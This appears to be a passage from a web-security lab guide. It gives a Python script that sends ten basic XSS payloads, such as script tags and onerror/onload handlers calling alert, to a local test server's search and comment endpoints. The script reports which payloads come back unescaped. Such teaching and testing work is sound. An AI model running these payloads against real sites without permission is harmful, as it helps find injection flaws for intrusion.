Subtask 2.2: Basic XSS Payload Testing
Create a script to test basic XSS payloads:

# Create basic XSS testing script
cat > manual_xss_test.py << 'EOF'
#!/usr/bin/env python3
import requests
import urllib.parse

# Basic XSS payloads
basic_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>"
]

def test_reflected_xss(base_url, payloads):
    print("Testing Reflected XSS...")
    print("-" * 50)
    
    for i, payload in enumerate(payloads, 1):
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{base_url}/search?q={encoded_payload}"
        
        try:
            response = requests.get(test_url)
            if payload in response.text:
                print(f"[VULNERABLE] Payload {i}: {payload}")
                print(f"URL: {test_url}")
                print(f"Response contains unescaped payload")
                print()
            else:
                print(f"[SAFE] Payload {i}: Payload was filtered or escaped")
        except Exception as e:
            print(f"[ERROR] Testing payload {i}: {e}")

def test_stored_xss(base_url, payloads):
    print("Testing Stored XSS...")
    print("-" * 50)
    
    for i, payload in enumerate(payloads, 1):
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{base_url}/comment?name=TestUser&comment={encoded_payload}"
        
        try:
            response = requests.get(test_url)
            if payload in response.text:
                print(f"[VULNERABLE] Payload {i}: {payload}")
                print(f"URL: {test_url}")
                print(f"Response contains unescaped payload")
                print()
            else:
                print(f"[SAFE] Payload {i}: Payload was filtered or escaped")
        except Exception as e:
            print(f"[ERROR] Testing payload {i}: {e}")

if __name__ == "__main__":
    base_url = "http://localhost:8080"
    
    print("Manual XSS Testing Script")
    print("=" * 50)
    
    test_reflected_xss(base_url, basic_payloads)
    print()
    test_stored_xss(base_url, basic_payloads)
EOF

